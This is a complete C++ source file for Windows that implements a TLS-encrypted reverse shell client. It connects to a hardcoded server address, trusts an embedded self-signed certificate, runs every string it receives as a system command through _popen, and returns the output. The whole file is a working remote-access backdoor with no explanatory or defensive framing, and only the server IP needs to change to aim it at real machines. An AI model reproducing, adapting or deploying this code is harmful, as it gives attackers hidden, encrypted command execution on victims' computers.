#include <winsock2.h>
#include <ws2tcpip.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <iostream>
#include <cstring>
#include <fstream>
#include <array>
#include <memory>
#include <cstdlib>
#include <windows.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")

static const char *SERVER_IP = "127.0.0.1";
static const int   SERVER_PORT = 443;

const char *server_cert =
"-----BEGIN CERTIFICATE-----\n"
"MIIDbTCCAlWgAwIBAgIUBowJXx0aD95i3GdXN3toheTPjmQwDQYJKoZIhvcNAQEL\n"
"BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM\n"
"GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAgFw0yNTA4MTgxODA4MzFaGA8yMTI1\n"
"MDcyNTE4MDgzMVowRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx\n"
"ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCASIwDQYJKoZIhvcN\n"
"AQEBBQADggEPADCCAQoCggEBAMmEYTU/WFBvTxRiVqiQR/xDMgb1ynaaWKLaeVpE\n"
"E7x5j0h8dlXjkAQrq8GAFZm2TwKYy8pXCsLqqXp+ET/WIHOfFL38qVLrTreoeh2V\n"
"4FcEEFCot2pLgNB20o2AYk7Hk6YA4mU4Yf5iLdmt/VBRAQz5Dz6phQY33cSrzI5r\n"
"MUfeqiSFQpw1gGR9HbYzpgnF2PrA7exqkdG0dUYGyz31cQ9SaZnH7Z1XYWg30TK7\n"
"Jh2+rPgaz8HI8/6K1waIMAnu8QiuCuh/t2H/pt6iuq0c2IpvZUuJwwtBfkhQhPFu\n"
"hR/HiNuUz9w6/IvDqb90u6jAlm4S22ax9stTXLQCH3qluGkCAwEAAaNTMFEwHQYD\n"
"VR0OBBYEFE5eu1dofp4QlF+0TaRkA/UqH7BWMB8GA1UdIwQYMBaAFE5eu1dofp4Q\n"
"lF+0TaRkA/UqH7BWMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB\n"
"AJD3YGZwt7NkGBYgk+osMG4o5EFOfg9VluHhCnPjf5ZrAyg7ZQ/KdrNZfNZBH9dP\n"
"9d1rW7CNV/h0vVUn3Q1oTy8hWIB5ldWEW35ifvysR7qV3cNzHvor4roMDs9NbEzY\n"
"nO6YGXLiwOho2dhMMzHrT3sqKjOBJ+e5TTzYyJBf9cWvLuTHHWF28kUGP2Jt3Pp0\n"
"vO1YIZPBUc2kNlCv8EjyIYv9DBCKj0X/un9zjcNF/SvhR44YZpuoxzZSAAf3IebX\n"
"bThviRp+l+NMGUY8y02W2fEas0lcJVmZ5/kS+t4PB2GT70Ya707JXaU2AwAL4vq1\n"
"ENlJ6Tq69oEh/AAnFzjd2c8=\n"
"-----END CERTIFICATE-----\n";

std::string write_temp_cert() {
    char temp_path[MAX_PATH];
    DWORD len = GetTempPathA(MAX_PATH, temp_path);
    if (len == 0 || len > MAX_PATH) {
        std::cerr << "Unable to get temp path\n";
        exit(EXIT_FAILURE);
    }

    std::string cert_path = std::string(temp_path) + "server_cert.pem";
    std::ofstream cert_file(cert_path);
    if (!cert_file) {
        std::cerr << "Unable to create temporary certificate file\n";
        exit(EXIT_FAILURE);
    }
    cert_file << server_cert;
    cert_file.close();
    return cert_path;
}

void initialize_openssl() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
}

void cleanup_openssl() {
    EVP_cleanup();
}

SSL_CTX *create_context() {
    const SSL_METHOD *method = TLS_client_method();
    SSL_CTX *ctx = SSL_CTX_new(method);
    if (!ctx) {
        std::cerr << "Unable to create SSL context\n";
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 | SSL_OP_NO_TLSv1 | SSL_OP_NO_TLSv1_1);
    return ctx;
}

void load_server_certificate(SSL_CTX *ctx) {
    std::string cert_path = write_temp_cert();

    if (SSL_CTX_load_verify_locations(ctx, cert_path.c_str(), NULL) != 1) {
        ERR_print_errors_fp(stderr);
        std::remove(cert_path.c_str());
        exit(EXIT_FAILURE);
    }

    std::remove(cert_path.c_str());
}

std::string execute_command(const std::string &command) {
    std::array<char, 128> buffer;
    std::string result;

    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(command.c_str(), "r"), _pclose);
    if (!pipe) {
        return "Error: Unable to open pipe.";
    }

    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }

    if (result.empty()) {
        return "Error: Command not found or execution failed.";
    }

    return result;
}

int main() {
    if (SERVER_PORT <= 0 || SERVER_PORT > 65535) {
        std::cerr << "Error: Invalid port number.\n";
        return EXIT_FAILURE;
    }

    WSADATA wsa_data;
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        std::cerr << "WSAStartup failed.\n";
        return EXIT_FAILURE;
    }

    initialize_openssl();

    SSL_CTX *ctx = create_context();
    load_server_certificate(ctx);

    SSL *ssl = SSL_new(ctx);
    if (!ssl) {
        std::cerr << "Unable to create SSL structure\n";
        ERR_print_errors_fp(stderr);
        SSL_CTX_free(ctx);
        cleanup_openssl();
        WSACleanup();
        return EXIT_FAILURE;
    }

    SOCKET sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sockfd == INVALID_SOCKET) {
        std::cerr << "Unable to create socket\n";
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        cleanup_openssl();
        WSACleanup();
        return EXIT_FAILURE;
    }

    struct sockaddr_in addr;
    std::memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(SERVER_PORT);

    addr.sin_addr.s_addr = inet_addr(SERVER_IP);
    if (addr.sin_addr.s_addr == INADDR_NONE) {
        std::cerr << "Invalid address/ Address not supported: " << SERVER_IP << "\n";
        closesocket(sockfd);
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        cleanup_openssl();
        WSACleanup();
        return EXIT_FAILURE;
    }

    if (connect(sockfd, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        std::cerr << "Connection failed (connect returned SOCKET_ERROR). Error: " << WSAGetLastError() << "\n";
        closesocket(sockfd);
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        cleanup_openssl();
        WSACleanup();
        return EXIT_FAILURE;
    }

    SSL_set_fd(ssl, static_cast<int>(sockfd));

    if (SSL_connect(ssl) <= 0) {
        ERR_print_errors_fp(stderr);
    } else {
        std::cout << "Connected to server " << SERVER_IP << ":" << SERVER_PORT << "!\n";

        while (true) {
            char buffer[1024] = {0};
            int bytes = SSL_read(ssl, buffer, static_cast<int>(sizeof(buffer) - 1));
            if (bytes > 0) {
                buffer[bytes] = '\0';
                std::string command(buffer);

                if (command == "exit") {
                    std::cout << "Exiting client.\n";
                    break;
                }

                std::string output = execute_command(command);

                if (SSL_write(ssl, output.c_str(), static_cast<int>(output.length())) <= 0) {
                    std::cerr << "Error writing to server.\n";
                    break;
                }
            } else if (bytes == 0) {
                std::cout << "Server closed the connection.\n";
                break;
            } else {
                std::cerr << "Error reading from server.\n";
                break;
            }
        }
    }

    SSL_shutdown(ssl);
    SSL_free(ssl);
    closesocket(sockfd);
    SSL_CTX_free(ctx);
    cleanup_openssl();
    WSACleanup();
    return 0;
}
